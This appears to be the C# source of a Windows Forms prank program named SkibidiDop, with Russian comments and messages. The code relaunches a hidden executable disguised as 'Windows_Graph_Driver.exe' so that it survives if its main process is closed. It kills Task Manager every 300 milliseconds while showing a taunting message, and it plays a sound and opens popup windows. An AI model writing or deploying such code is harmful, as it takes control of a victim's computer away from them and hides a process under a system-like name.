using SkibidiDop.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SkibidiDop
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        Random rd = new Random();

        async void CloseSkib() 
        { 
            await Task.Delay(10000); 
            Close();
        }
        void Cmd (string line)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/c {line}",
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        async void StartSTART()
        {
            Task.Delay(rd.Next(1500,5000));
            var process = Process.GetProcessesByName("Windows_Graph_Driver");
            while (process.Any(x => !x.HasExited))
                await Task.Delay(1000).ConfigureAwait(false);

            Cmd($"start \"\" \"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}/Windows Doppler Drives/Windows_Graph_Driver.exe\" ");
           // Cmd("start \"\" \"%programfiles%/Windows Doppler Drives/Windows_Graph_Driver.exe\" ");
        }
        void Form1_Load(object sender, EventArgs e)
        {
            StartSTART(); //на случай если закроют основной процесс :)
            isTaskMgr();          
            CloseSkib();


            SoundPlayer audio = new SoundPlayer(Resources.sound);
            audio.Play();

            Form form = new Form2();
                form.Location = new Point(rd.Next(-12, 1200), rd.Next(0, 530)); //(-12;0) (1200;530)
                form.Show();

        }

        async void isTaskMgr()
        {
            while (true)
            {
                try
                {
                    foreach (Process Proc in Process.GetProcesses())
                        if (Proc.ProcessName.Equals("Taskmgr"))  //Process Excel?
                        { Proc.Kill(); MessageBox.Show("Ахаха, твой Диспетчер задач ЗАБЛОКИРОВАН","ХЪЫФЗЩАХЗФЫЩАХЗФЫЩА :)"); }
                    await Task.Delay(300);
                }
                catch { await Task.Delay(300); }
            }
        }
    }
}
